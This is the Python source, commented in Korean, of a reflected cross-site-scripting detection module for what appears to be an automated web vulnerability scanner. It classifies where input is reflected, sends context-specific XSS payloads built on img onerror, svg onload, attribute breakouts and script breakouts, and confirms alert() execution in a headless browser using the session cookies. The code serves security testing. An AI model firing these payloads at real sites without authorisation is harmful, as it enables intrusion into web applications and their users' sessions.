import asyncio
import random
import string
import threading
from html import escape as html_escape

import requests

from fbs.inference.models import AttackSurface, VulnResult
from fbs.inference.waf import classify_waf_block
from fbs.inference.strategies.base import BaseStrategy

"""
Reflected XSS strategy (MVP).

web_scanner/pipelines/xss.py(Scrapy 콜백 체인)의 '탐지 로직'만 가져오고 배관은
FBS 추론 엔진(동기 requests.Session + AttackSurface + VulnResult)에 맞춰 새로 썼다.
옛 코드에서 실제로 재활용한 발상:
  - 컨텍스트별 페이로드 택소노미(html/attr/script/...)
  - "마커가 baseline에 이미 있으면 스킵"으로 기존 문자열 오탐 방지
  - escaped vs unescaped 구분 → 여기서는 "실행 가능 시그니처 verbatim 매칭"으로 강화
  - Playwright를 별도 스레드 + ProactorEventLoop로 돌려 동기 문맥에서 실행 확인
    (Windows에서 chromium subprocess를 띄우려면 ProactorEventLoop가 필요)
  - dialog 핸들러로 alert() 메시지를 포획해 실제 실행을 확정

옛 코드와 달라진 점:
  - 페이로드를 난사하지 않고, 중립 카나리를 먼저 주입해 '반사 위치(컨텍스트)'를
    분류한 뒤 그 컨텍스트에 맞는 페이로드만 보낸다(요청 수/오탐 감소).
  - 반사형도 Playwright로 실제 실행(alert 발화)을 확인한다(옛 코드는 stored만 확인).

시퀀스:
  baseline → 카나리 반사/컨텍스트 분류 → 컨텍스트별 페이로드 전송(raw 반사 확인)
  → raw 반사된 후보들을 브라우저 1세션에서 실행 확인 → VulnResult

확정 단계:
  - 브라우저에서 alert(marker)가 실제로 발화 → HIGH (실행 확정)
  - raw 반사는 됐지만 브라우저 미가용/미발화 → MEDIUM (반사 확인, 실행 미확정)

아직 안 하는 것(TODO, 의도적으로 범위 밖):
  - Stored XSS(고유 마커 주입 후 다른 페이지 싱크 확인)
  - DOM-based XSS(소스→싱크 JS 흐름)
  - XSS 전용 WAF 우회(EVASION_TRANSFORMS는 SQL 키워드용이라 XSS엔 부적합)
"""


class XSSStrategy(BaseStrategy):

    VULN_TYPE = 'xss'
    TIMEOUT = 10
    # 브라우저에서 폼 제출 후 alert/네비게이션을 기다리는 시간(ms).
    BROWSER_WAIT_MS = 1500
    # 카나리: 순수 영숫자라 어떤 컨텍스트에서도 이스케이프/인코딩 없이 그대로 반사된다.
    _CANARY_PREFIX = 'fbsxc'
    _MARKER_PREFIX = 'fbsxm'

    # 컨텍스트별 페이로드 템플릿. {M}=실행 확인용 마커(영숫자).
    #   payload   : 필드에 실제로 넣을 문자열
    #   exec_sig  : 이 문자열이 '이스케이프되지 않고' 응답에 그대로 박혔는지 확인할 핵심
    #               실행 시그니처(verbatim 매칭). 서버가 <,>,",' 중 하나라도 엔티티로
    #               바꾸면 이 시그니처가 깨져 매칭 실패 → raw 반사 아님으로 본다.
    # alert 따옴표는 컨텍스트 breakout 따옴표와 겹치지 않게 고른다.
    _CONTEXT_PAYLOADS: dict[str, list[tuple[str, str]]] = {
        # 태그 사이 텍스트 — 바로 태그 주입
        'html': [
            ("<img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')"),
            ("<svg/onload=alert('{M}')>",        "<svg/onload=alert('{M}')"),
        ],
        # 겹따옴표 속성값 — "> 로 빠져나옴 (alert는 홑따옴표)
        'attr_double': [
            ('"><img src=x onerror=alert(\'{M}\')>', "<img src=x onerror=alert('{M}')"),
        ],
        # 홑따옴표 속성값 — '> 로 빠져나옴 (alert는 겹따옴표)
        'attr_single': [
            ("'><img src=x onerror=alert(\"{M}\")>", '<img src=x onerror=alert("{M}")'),
        ],
        # 따옴표 없는 속성값 — 새 이벤트 핸들러 + autofocus로 상호작용 없이 발화
        'attr_unquoted': [
            (" autofocus onfocus=alert('{M}') x=", "onfocus=alert('{M}')"),
        ],
        # <script> 내부 — </script>로 스크립트를 닫고 태그 주입(가장 견고)
        'js': [
            ("</script><img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')"),
            ("';alert('{M}');//",                          "alert('{M}')"),
        ],
        # HTML 주석 내부 — -->로 주석을 닫고 태그 주입
        'comment': [
            ("--><img src=x onerror=alert('{M}')>", "<img src=x onerror=alert('{M}')"),
        ],
    }

    def __init__(self, session: requests.Session | None = None):
        self.session = session or requests.Session()
        # Playwright 가용 여부를 프로세스 단위로 한 번만 판정해 캐싱(매번 import 시도 안 함).
        self._browser_available: bool | None = None

    # ── BaseStrategy 인터페이스 ──────────────────────────────────────────────

    def can_handle(self, surface: AttackSurface) -> bool:
        if surface.surface_type not in ('form_field', 'url_param', 'hidden_param', 'api_field'):
            return False
        # JSON 프록시 폼은 반사형 XSS 대상이 아님(응답에 HTML로 반사되지 않음)
        if surface.extra.get('proxy_template'):
            return False
        hints = surface.extra.get('hints', {})
        if hints.get('xss', 0.0) > 0:
            return True
        # 필드명 힌트가 없어도, 엔진의 blind 프로브가 'HTML 메타문자(<,>)가 이스케이프
        # 없이 반사됨'을 관측했으면(reflects_html) XSS 전제가 충족된 것 — 이건 단순 반사
        # (SQLi 등도 반사함)와 달리 XSS에 특정적인 신호라, 여기서만 동작을 시작해 과도
        # 트리거를 막는다. param/memo처럼 이름만으론 아무 힌트도 못 받는 진짜 반사형
        # 싱크(/vuln?param=)를 이 경로로 잡는다.
        if surface.extra.get('reflects_html'):
            return True
        return False

    def priority(self, surface: AttackSurface) -> float:
        """XSS 우선순위 — profiler의 xss hint 점수를 쓰되, 필드명 힌트가 없어도 메타문자가
        이스케이프 없이 반사되면(reflects_html) XSS가 사실상 확정적이므로 강한 점수(0.7)로
        올린다. 엔진은 이 값과 다른 전략(예: SQLi의 sqli hint)을 비교해 더 높은 하나만 돌린다
        — 그래서 반사되지 않는 로그인 필드(sqli 0.8 > xss 0.4)에선 XSS가 아예 시작되지 않는다."""
        base = surface.extra.get('hints', {}).get('xss', 0.0)
        if surface.extra.get('reflects_html'):
            return max(base, 0.7)
        return base

    def run(self, surface: AttackSurface) -> list[VulnResult]:
        base_fields = self._base_fields(surface)

        # 0. baseline — 마커/카나리가 원래 페이지에 이미 있었는지 확인용
        status, baseline_body, _ = self._send(surface, dict(base_fields))
        if status is None:
            print("    [XSS] baseline 요청 실패 — 스킵")
            return []

        # 1. 카나리로 반사 여부 + 컨텍스트 분류
        canary = self._rand_token(self._CANARY_PREFIX)
        status, body, _ = self._send(surface, {**base_fields, surface.param: canary})
        if status is None:
            return []
        if canary not in body:
            print("    [XSS] 입력이 응답에 반사되지 않음 — 반사형 XSS 아님 (blind/stored는 범위 밖)")
            return []

        contexts = self._reflection_contexts(body, canary)
        print(f"    [XSS] 반사 확인 — 컨텍스트: {', '.join(sorted(set(contexts)))}")

        # 2. 컨텍스트별 페이로드 전송 → raw 반사(이스케이프 안 됨) 후보 수집
        candidates = []  # [{context, payload, marker, fields}]
        for ctx in sorted(set(contexts)):
            for template, sig_template in self._CONTEXT_PAYLOADS.get(ctx, []):
                marker = self._rand_token(self._MARKER_PREFIX)
                if marker in baseline_body:
                    continue  # 극히 드문 충돌 — 안전하게 스킵
                payload = template.format(M=marker)
                exec_sig = sig_template.format(M=marker)
                p_status, p_body, _ = self._send(surface, {**base_fields, surface.param: payload})
                if p_status is None:
                    continue
                blocked, waf_name, _ = classify_waf_block(p_status, p_body)
                if blocked:
                    print(f"      · {ctx}: 차단됨({waf_name}) — XSS 전용 우회는 미구현, 스킵")
                    continue
                if exec_sig in p_body:
                    print(f"      · {ctx}: raw 반사 확인 (실행 시그니처 원형 유지)")
                    candidates.append({
                        'context': ctx,
                        'payload': payload,
                        'marker': marker,
                        'fields': {**base_fields, surface.param: payload},
                    })
                    break  # 컨텍스트당 첫 성공 페이로드 하나면 충분
                else:
                    print(f"      · {ctx}: 반사됐으나 이스케이프됨(실행 불가) — 정탐 아님")

        if not candidates:
            print("    [XSS] 실행 가능한 raw 반사 후보 없음 — 취약점 아님")
            return []

        # 3. 브라우저로 실제 실행(alert 발화) 확인
        fired = self._run_browser_confirm(surface, candidates)

        if fired is None:
            # Playwright 미가용 — raw 반사까지만 확인됨
            best = candidates[0]
            print("    [XSS] Playwright 미설치 — 실행 확정 불가, 반사 근거로 MEDIUM 보고")
            return [self._make_result(surface, best, confirmed=False,
                                       note='Playwright 미설치로 실행 미확정')]

        for cand in candidates:
            if fired.get(cand['marker']):
                print(f"    [XSS] 브라우저 실행 확정 — alert('{cand['marker']}') 발화 ({cand['context']})")
                return [self._make_result(surface, cand, confirmed=True,
                                           alert_msg=fired[cand['marker']])]

        # raw 반사는 됐지만 브라우저에서 발화 안 함(CSP 등 가능성)
        best = candidates[0]
        print("    [XSS] raw 반사 확인됐으나 브라우저 실행 미관측(CSP 등 가능) — MEDIUM 보고")
        return [self._make_result(surface, best, confirmed=False,
                                   note='raw 반사 확인, 브라우저 실행 미관측(CSP 등 가능)')]

    # ── 요청 전송 ────────────────────────────────────────────────────────────

    def _base_fields(self, surface: AttackSurface) -> dict:
        """target 필드와 함께 보낼 나머지 필드의 기본값(SQLiStrategy._base_fields와 동일 규칙)."""
        if surface.surface_type == 'url_param':
            raw = (surface.page or {}).get('params') or {}
            data = {k: (v[0] if isinstance(v, list) and v else 'test') for k, v in raw.items()}
        else:
            data = dict(surface.extra.get('all_params') or {})
        data.setdefault(surface.param, 'test')
        return data

    def _send(self, surface: AttackSurface, data: dict, timeout: int | None = None):
        """(status, body, elapsed) — 실패 시 (None, '', 0.0)."""
        import time
        timeout = timeout or self.TIMEOUT
        enctype = surface.extra.get('enctype') or ''
        start = time.monotonic()
        try:
            if surface.method == 'GET':
                resp = self.session.get(surface.url, params=data, timeout=timeout)
            elif 'application/json' in enctype:
                resp = self.session.request(surface.method, surface.url, json=data, timeout=timeout)
            else:
                resp = self.session.request(surface.method, surface.url, data=data, timeout=timeout)
            return resp.status_code, resp.text, time.monotonic() - start
        except Exception:
            return None, '', time.monotonic() - start

    # ── 반사 컨텍스트 분류 ────────────────────────────────────────────────────

    def _reflection_contexts(self, body: str, marker: str) -> list[str]:
        """marker가 반사된 모든 위치의 HTML 컨텍스트를 분류한다.

        raw 문자열을 파서로 넣으면 주입 마커가 파싱을 깨서 위치를 잃기 쉬우므로,
        marker 인덱스 주변 원문을 직접 스캔하는 휴리스틱으로 분류한다(범용 XSS 스캐너의
        고전적 접근)."""
        found = []
        start = 0
        while True:
            i = body.find(marker, start)
            if i == -1:
                break
            found.append(self._classify_one(body, i))
            start = i + len(marker)
        return found or ['html']

    @staticmethod
    def _classify_one(body: str, i: int) -> str:
        before = body[:i]

        # <script> ... </script> 내부?
        s_open = before.rfind('<script')
        s_close = before.rfind('</script')
        if s_open != -1 and s_open > s_close:
            return 'js'

        # <!-- ... --> 주석 내부?
        c_open = before.rfind('<!--')
        c_close = before.rfind('-->')
        if c_open != -1 and c_open > c_close:
            return 'comment'

        last_lt = before.rfind('<')
        last_gt = before.rfind('>')
        if last_lt > last_gt:
            # 태그 여는 '<' 이후 아직 '>'로 안 닫힘 → 태그 내부(속성 영역)
            tag_frag = before[last_lt:]
            # 현재 위치가 열린 따옴표 안인지: 태그 시작 이후 따옴표 개수가 홀수면 그 안쪽
            if tag_frag.count('"') % 2 == 1:
                return 'attr_double'
            if tag_frag.count("'") % 2 == 1:
                return 'attr_single'
            return 'attr_unquoted'

        # 그 외 — 태그 사이 일반 텍스트
        return 'html'

    # ── 브라우저 실행 확인 (Playwright) ───────────────────────────────────────

    def _run_browser_confirm(self, surface: AttackSurface, candidates: list) -> dict | None:
        """후보 페이로드들을 실제 브라우저에서 제출해 alert 발화를 확인한다.

        반환: {marker: alert_message} (발화한 것만). Playwright 미가용이면 None.

        Windows에서 chromium subprocess를 띄우려면 ProactorEventLoop가 필요한데,
        추론 엔진은 동기(메인 스레드) 흐름이라 전용 스레드에서 자체 이벤트 루프를
        돌린다(옛 web_scanner xss.py의 stored 확인 패턴을 그대로 재활용)."""
        holder: dict = {}

        def worker():
            try:
                from playwright.async_api import async_playwright  # noqa: F401
            except ImportError:
                holder['unavailable'] = True
                return
            if hasattr(asyncio, 'ProactorEventLoop'):
                loop = asyncio.ProactorEventLoop()
            else:
                loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                holder['result'] = loop.run_until_complete(
                    self._browser_confirm(surface, candidates))
            except Exception as e:
                holder['error'] = e
            finally:
                loop.close()

        t = threading.Thread(target=worker)
        t.start()
        t.join()

        if holder.get('unavailable'):
            return None
        if 'error' in holder:
            print(f"    [XSS] 브라우저 확인 중 오류: {holder['error']} — 반사 근거로만 보고")
            return {}
        return holder.get('result', {})

    async def _browser_confirm(self, surface: AttackSurface, candidates: list) -> dict:
        from playwright.async_api import async_playwright

        fired: dict = {}
        cookies = self._browser_cookies(surface.url)

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            context = await browser.new_context()
            if cookies:
                try:
                    await context.add_cookies(cookies)
                except Exception:
                    pass
            page = await context.new_page()

            current = {'marker': None}

            async def on_dialog(dialog):
                # alert('marker')의 메시지가 우리 마커와 같으면 그 페이로드가 실행된 것
                if current['marker'] is not None and dialog.message == current['marker']:
                    fired[current['marker']] = dialog.message
                try:
                    await dialog.dismiss()
                except Exception:
                    pass

            page.on('dialog', on_dialog)

            for cand in candidates:
                current['marker'] = cand['marker']
                html = self._auto_submit_form(surface, cand['fields'])
                try:
                    await page.set_content(html)
                    await page.wait_for_timeout(self.BROWSER_WAIT_MS)
                except Exception:
                    pass

            await browser.close()
        return fired

    def _browser_cookies(self, url: str) -> list[dict]:
        """추론 세션의 쿠키를 Playwright 컨텍스트에 심을 형태로 변환한다 —
        로그인/세션이 필요한 앱에서도 크롤링 때와 같은 인증 상태로 확인하기 위함."""
        out = []
        for c in self.session.cookies:
            if c.name:
                out.append({'name': c.name, 'value': c.value or '', 'url': url})
        return out

    def _auto_submit_form(self, surface: AttackSurface, fields: dict) -> str:
        """target URL로 자동 제출되는 폼 HTML을 만든다. GET/POST 동일하게 처리되고,
        input value는 html-escape해서 넣으므로 브라우저가 디코딩해 '원형 페이로드'를
        그대로 전송한다(이중 인코딩 방지)."""
        method = 'POST' if surface.method != 'GET' else 'GET'
        inputs = ''.join(
            f'<input name="{html_escape(str(k), quote=True)}" '
            f'value="{html_escape(str(v), quote=True)}">'
            for k, v in fields.items()
        )
        action = html_escape(surface.url, quote=True)
        return (
            f'<!doctype html><html><body>'
            f'<form id="fbsf" method="{method}" action="{action}">{inputs}</form>'
            f'<script>document.getElementById("fbsf").submit();</script>'
            f'</body></html>'
        )

    # ── 결과 생성 ────────────────────────────────────────────────────────────

    def _make_result(self, surface: AttackSurface, cand: dict,
                     confirmed: bool, alert_msg: str | None = None,
                     note: str | None = None) -> VulnResult:
        severity = 'HIGH' if confirmed else 'MEDIUM'
        if confirmed:
            evidence = f"브라우저에서 alert('{cand['marker']}') 실제 발화 — 컨텍스트 {cand['context']}"
        else:
            evidence = f"응답에 실행 시그니처가 이스케이프 없이 반사됨 — 컨텍스트 {cand['context']}"
            if note:
                evidence += f" ({note})"
        return VulnResult(
            surface=surface,
            vuln_type='XSS',
            severity=severity,
            payload=cand['payload'],
            evidence=evidence,
            detail={
                'context': cand['context'],
                'marker': cand['marker'],
                'confirmed_by': 'browser' if confirmed else 'reflection',
                'alert_message': alert_msg,
                'note': note,
            },
        )

    # ── 유틸 ─────────────────────────────────────────────────────────────────

    @staticmethod
    def _rand_token(prefix: str) -> str:
        return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
